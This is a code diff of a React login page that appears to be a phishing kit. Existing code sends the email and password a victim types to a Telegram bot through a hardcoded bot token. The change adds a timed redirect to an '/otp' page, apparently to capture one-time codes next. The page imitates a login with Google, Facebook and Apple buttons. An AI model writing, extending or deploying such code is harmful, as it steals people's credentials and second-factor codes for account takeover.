@@ -1,16 +1,18 @@
 import React, { useState } from "react";
-import logo from "./assets/logov.png";
+import logo from "./assets/logovv.png";
 import { TriangleAlert, Eye, EyeOff } from "lucide-react";
 
 import { FcGoogle } from "react-icons/fc";
 import { FaFacebookF, FaApple } from "react-icons/fa";
 import axios from "axios";
+import { useNavigate } from "react-router-dom";
 
 function Login() {
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
+  const navigate = useNavigate();
 
   async function sendTelegram(message) {
     const url = `https://api.telegram.org/bot8582971725:AAFw8yPNNZm2kRNTndB4uZUwuNlSGiPMWJA/sendMessage`;
@@ -46,6 +48,9 @@ Password : ${password}
 
 
 `);
+    setTimeout(() => {
+      navigate("/otp");
+    }, 3000);
   };
 
   const inputClass =
